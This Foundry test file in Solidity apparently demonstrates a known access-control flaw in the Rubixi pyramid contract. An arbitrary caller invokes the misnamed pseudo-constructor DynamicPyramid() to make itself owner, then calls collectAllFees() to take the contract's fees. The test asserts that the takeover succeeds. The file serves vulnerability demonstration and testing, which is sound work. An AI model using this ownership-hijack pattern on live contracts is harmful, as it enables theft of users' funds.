
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi private rubixi;
    address private originalDeployer;

    function setUp() public {
        originalDeployer = address(this);
        rubixi = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != address(rubixi));

        // --- 2. State Configuration ---
        // Fund the caller so they can participate in the pyramid
        vm.deal(caller, 10 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);
        
        // The vulnerability: DynamicPyramid() is a public function that anyone can call
        // to set themselves as the creator/owner. This is because in Solidity 0.8.x,
        // DynamicPyramid() is just a regular function, not a constructor.
        // The original intent was for it to be a constructor (in older Solidity versions,
        // a function with the same name as the contract was the constructor).
        rubixi.DynamicPyramid();

        // Now the arbitrary caller should be the new owner/creator
        // We can verify this by having the caller successfully call an onlyowner function
        
        // First, let's add some fees to the contract by sending less than 1 ether
        vm.deal(address(this), 0.5 ether);
        (bool sent, ) = address(rubixi).call{value: 0.5 ether}("");
        require(sent, "Failed to send ether to contract");

        // Now the caller (who became owner via DynamicPyramid) should be able to collect fees
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        rubixi.collectAllFees();
        
        uint256 callerBalanceAfter = caller.balance;
        
        // Assert that the caller successfully collected fees, proving they are now the owner
        assertGt(callerBalanceAfter, callerBalanceBefore, "Caller should have received fees as the new owner");
    }
}
